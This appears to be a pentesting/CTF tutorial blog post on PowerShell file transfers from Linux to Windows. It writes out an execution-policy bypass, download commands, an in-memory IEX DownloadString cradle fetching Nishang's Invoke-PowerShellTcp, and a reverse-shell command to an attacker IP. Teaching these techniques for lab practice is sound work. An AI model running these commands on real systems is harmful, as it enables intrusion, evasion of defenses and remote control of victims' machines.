---
layout: post
title: 'File Transfers - Part 3: PowerShell File Transfers'
date: '2022-10-22 17:57:48 +0100'
categories: [Tutorial, OSCP]
tags: [linux, windows, oscp, python, file-transfer, pentesting, code, tutorial, ctf, powershell]
---

This is part of a series of tutorials on file transfer methods for pentesting and CTF scenarios.

_Disclaimer: It is necessary to disable any Anti-Virus (Windows Defender etc.) and also potentially any Firewalls
on the Windows system for these transfers to work. It is highly recommended to do this in a safe, virtualised environment that is not connected to any public network or the Internet. You're responsible for the security of your own systems. These tutorials are for educational purposes only._

# Linux to Windows File Transfer

In this tutorial, we will cover the use of `powershell` to transfer files from Linux to Windows.

## Scenario

- We will transfer the file to `C:\Windows\Tasks` on WINDOWS, for reasons explained in [Part 2](https://dev-0x0.github.io/posts/file-transfers-part-2/) of this tutorial series.
- Once again we will use the **Python HTTP Server** to serve the file on our LINUX system, as explained in [File Transfers: Part 1](https://dev-0x0.github.io/posts/file-transfers).

![serve-file](/assets/img/file-transfers-2/serve-file.png)

## Transferring files with Powershell.exe

Often, our initial shell on a target Windows system will be a CMD shell. 
We can attempt to switch to a PowerShell prompt with the following command:

`powershell -ep bypass`

![bypass](/assets/img/file-transfers-3/bypass.png)

The `-ep` stands for 'Execution Policy'. According to Microsoft:

> PowerShell's execution policy is a safety feature that controls the conditions under which PowerShell loads configuration files and runs scripts. This feature helps prevent the execution of malicious scripts.

And setting the Execution Policy to 'bypass' means:

> Nothing is blocked and there are no warnings or prompts.

Basically, it allows us to load PowerShell modules and execute scripts unhindered. This is usually what we want.

Learn more [here](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2)

### 1. Invoke-WebRequest

`Invoke-WebRequest -URI http://192.168.56.102:8000/PrivescCheck.ps1 -OutFile C:\Windows\Tasks\PrivescCheck.ps1`

---

`IWR -URI http://192.168.56.102:8000/PrivescCheck.ps1 -o C:\Windows\Tasks\PrivescCheck.ps1`

![iwr](/assets/img/file-transfers-3/iwr.png)

Both of the above commands do the same thing, with `IWR` simply being a shorthand for `Invoke-WebRequest`.
The options `-URI` and `-OutFile` here are self-explanatory. Looking through the help documents for PowerShell commands,
you will find that many commands and their options have a shorthand alternative. For instance, in the second command above we used `-o` in place of `-OutFile`. See the help info on any command with `Get-Help [PowerShell Command]`.

Another handy alias for this command is `wget`, taking its name from the well-known Linux command-line tool covered in [Part 1](https://dev-0x0.github.io/posts/file-transfers) of these tutorials.

`wget http://192.168.56.102:8000/PrivescCheck.ps1 -o C:\Windows\Tasks\PrivescCheck.ps1`

![wget](/assets/img/file-transfers-3/wget.png)

### 2. Invoke-Expression - Method 1: DownloadFile

`Invoke-Expression "(New-Object Net.WebClient).DownloadFile('http://192.168.56.102:8000/PrivescCheck.ps1', 'C:\Windows\Tasks\PrivescCheck.ps1')"`

---

`IEX "(New-Object Net.WebClient).DownloadFile('http://192.168.56.102:8000/PrivescCheck.ps1', 'C:\Windows\Tasks\PrivescCheck.ps1')"`

![iex](/assets/img/file-transfers-3/iex.png)

Both of the above commands do the same thing. This command is easy to understand, it downloads the file located at the URI in the first parameter, to the location on the target system in the second parameter. As in Method 1 above, we see that `Invoke-Expression` can be shortened to `IEX`.

`New-Object` creates a new .NET Framework or COM object.<br>
`Net.WebClient` is the type of object that is created. It provides methods for sending/receiving data given a URI.<br>
`DownloadFile` is one such method. 

### 3. Invoke-Expression - Method 2: DownloadString

This example is slightly different, in that we are able to execute a script **in memory** on the target system. The file is still transferred, but only in order to execute it and ideally leave no trace on disk.

For this example, we will be using the **Invoke-PowerShellTcp.ps1** script from the [Nishang](https://github.com/samratashok/nishang) Framework. This script
enables us to execute a reverse or bind shell on the target. We will be using the reverse shell functionality.

We are going to execute this command from a CMD shell, as doing so will allow us to automatically execute the script
on the target.

`powershell IEX "(New-Object Net.WebClient).DownloadString('http://192.168.56.102:8000/Invoke-PowerShellTcp.ps1')"`

The command is similar to `DownloadFile`. However, we note the lack of a destination download location.

The **caveat** with this method is that you must include the execution command in the file itself.
For instance, a conventional scenario would be to import a powershell module from the prompt:

`. .\Invoke-PowerShellTcp.ps1`

We would then execute the reverse shell command like so:

`Invoke-PowerShellTcp -Reverse -IPAddress 192.168.254.226 -Port 4444`

However, when using `DownloadString`, we must include this command at the end of the file for it to execute, since we are never storing it to disk. We are simply using **Invoke-PowerShellTcp.ps1** as our example here. The script could be anything really.

We therefore append the command(whatever the appropriate command for the file we are transferring) to the bottom of the file prior to transfer:

![edit-file](/assets/img/file-transfers-3/edit-file.png)

Now we can transfer the file, and have it executed immediately. We will as usual serve the file with the **Python HTTP Server**, then start a **Netcat** listener on our attacking machine, and execute the PowerShell command on the target Windows system.

Executing our Powershell command
![downloadString](/assets/img/file-transfers-3/psh-iex.png)

Here we see the GET request made by PowerShell, and we catch the reverse shell
![reverse-shell](/assets/img/file-transfers-3/reverse-shell.png)


### Executing PowerShell Commands From a CMD prompt

`cmd /C powershell IWR -uri http://192.168.56.102:8000/PrivescCheck.ps1 -o C:\Windows\Tasks\PrivescCheck.ps1`

As we saw from the example above, from a CMD prompt, we can execute `powershell` commands. Another way to do this is using `cmd` with the `/C` option. The `/C` meaning 'Command' to execute. More info on this can be found by looking at the help section for `cmd.exe` with `cmd /?`.

Any of the PowerShell commands above can be executed in this manner.

## Conclusion

PowerShell presents a multitude of options for transferring and executing files. It's well worth getting comfortable with PowerShell, as it's a great addition to your personal toolkit. Hope you got something out of this tutorial. Thanks for reading!